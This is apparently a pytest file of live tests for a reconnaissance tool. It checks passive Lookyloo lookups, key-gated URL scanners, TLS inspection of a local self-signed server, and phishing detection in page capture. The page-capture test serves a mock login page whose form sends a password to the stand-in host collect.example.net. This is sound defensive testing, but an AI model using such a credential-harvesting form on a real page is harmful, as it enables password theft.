"""Live checks of batch p9-G03-3 (P078 url scanners, P275 tls_inspect, P347 page_capture); run with V3LUM_LIVE=1.

* url_scanners_lookyloo - a PASSIVE keyless lookup of existing captures of the benign IANA host
  example.com on CIRCL's public Lookyloo (hostname_info, cached captures only; no submission exists).
* url_scanners_third_party - without the company keys the module must answer NEEDS_KEY and send nothing
  (urlDNA/urlquery need keys; their recorded keyless answers are offline fixtures).
* tls_inspect - target contact only with a local TLS server this test starts on 127.0.0.1 (internal
  seed): no third-party host is ever handshaken from tests.
* page_capture - the single @live test runs only when the optional extra (playwright + Chromium) is
  installed and the process can sandbox Chromium (not root); it renders a page served by a local
  127.0.0.1 server through the real route handler. Skipped otherwise.
"""

from __future__ import annotations

import shutil
import socket
import ssl
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest

from tests.fakes import FakeHttp, run_module
from v3lum.config import Config
from v3lum.core.context import Runtime, ScanOptions
from v3lum.core.models import Opsec, Status

pytestmark = pytest.mark.live
COULD_NOT_VERIFY = {Status.RATE_LIMITED, Status.BLOCKED, Status.ERROR, Status.QUOTA}


def live_runtime(**settings):
    cfg = Config()
    cfg.settings.update(settings)
    return Runtime(cfg, no_cache=True)


def test_lookyloo_existing_captures_of_example_com():
    from v3lum.modules.url_web.url_scanners_third_party import UrlScannersLookyloo

    res = run_module(UrlScannersLookyloo, "domain:example.com", runtime=live_runtime())
    assert res.status in {Status.OK, Status.EMPTY} | COULD_NOT_VERIFY, (res.status, res.error)
    if res.status is Status.OK:
        caps = res.attributes["lookyloo_captures"]
        assert caps and all(c["tree_url"].startswith("https://lookyloo.circl.lu/tree/") for c in caps)
    assert set(res.hosts) <= {"lookyloo.circl.lu"}
    if res.status is Status.OK:
        # captures of other sites that merely contain example.com never give pivots (observed 2026-11-26)
        leads = {c["capture_uuid"] for c in res.attributes["lookyloo_captures"] if c.get("subject_role") in ("captured", "redirect")}
        assert all(p.relation.startswith("scanner_") for p in res.pivots)
        assert leads or not res.pivots


def test_keyed_scanners_without_keys_are_needs_key_and_silent():
    from v3lum.modules.url_web.url_scanners_third_party import UrlScannersThirdParty

    http = FakeHttp()
    res = run_module(UrlScannersThirdParty, "domain:example.com", http)
    assert res.status is Status.NEEDS_KEY and http.calls == []


def _cert(folder):
    if shutil.which("openssl") is None:
        pytest.skip("openssl is not installed")
    cert, key = folder / "cert.pem", folder / "key.pem"
    subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", str(key), "-out", str(cert), "-days", "2",
                    "-subj", "/CN=127.0.0.1", "-addext", "subjectAltName=IP:127.0.0.1"], check=True, capture_output=True, timeout=60)
    return cert, key


def test_tls_inspect_against_a_local_server_only(tmp_path):
    from v3lum.modules.pentest_recon import tls_inspect as mod

    cert, key = _cert(tmp_path)
    server_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    server_ctx.load_cert_chain(str(cert), str(key))
    srv = socket.socket()
    srv.bind(("127.0.0.1", 0))
    srv.listen(1)
    srv.settimeout(10)

    def serve():
        try:
            raw, _ = srv.accept()
            with server_ctx.wrap_socket(raw, server_side=True):
                pass
        except OSError:
            pass

    thread = threading.Thread(target=serve, daemon=True)
    thread.start()
    mod._MEMO.clear()
    port = srv.getsockname()[1]
    try:
        res = run_module(mod.TlsInspect, f"url:https://127.0.0.1:{port}/", runtime=live_runtime(), options=ScanOptions(mode=Opsec.LIGHT),
                         internal_seed=True)
    finally:
        srv.close()
        thread.join(timeout=10)
    # the self-signed test certificate does not verify with the system store: reported, never 'empty'
    assert res.status in (Status.OK, Status.ERROR), (res.status, res.error)
    hs = res.attributes.get("tls_handshake") or {}
    assert hs.get("port") == port and hs.get("verified") is False
    assert {f.title for f in res.findings} & {"Self-signed TLS certificate", "TLS certificate chain does not verify"}


def test_page_capture_renders_a_local_page_through_the_route_handler(monkeypatch):
    pytest.importorskip("playwright")
    from v3lum.modules.url_web import page_capture as mod

    if mod.running_as_root():
        pytest.skip("Chromium cannot sandbox as root: page_capture refuses to start (P347 c2)")

    class Page(BaseHTTPRequestHandler):
        def do_GET(self):  # noqa: N802
            body = b"<html><head><title>Entrar</title></head><body><form action='https://collect.example.net/p'>" \
                   b"<input type='password' name='p'></form></body></html>"
            self.send_response(200)
            self.send_header("content-type", "text/html")
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *_a):
            pass

    srv = ThreadingHTTPServer(("127.0.0.1", 0), Page)
    thread = threading.Thread(target=srv.serve_forever, kwargs={"poll_interval": 0.05}, daemon=True)
    thread.start()
    monkeypatch.setattr(mod, "case_tags", lambda ctx, entity, url: {"phishing"})
    monkeypatch.setattr(mod, "proxy_light", lambda ctx: "http://127.0.0.1:9")
    # the local test page is an internal seed (the destination guard refuses loopback for real captures)
    monkeypatch.setattr(mod, "destination_block_reason", lambda url, resolved_ips=(): None)
    url = f"http://127.0.0.1:{srv.server_address[1]}/login"
    try:
        res = run_module(mod.PageCapture, f"url:{url}", runtime=live_runtime(), options=ScanOptions(mode=Opsec.LIGHT, include={"page_capture"}),
                         internal_seed=True)
    finally:
        srv.shutdown()
        thread.join(timeout=10)
    assert res.status is Status.OK, (res.status, res.error)
    assert res.attributes["page_capture"]["sha256"]["screenshot"]
    assert res.attributes["capture_verdict"] == "phishing indicators observed"
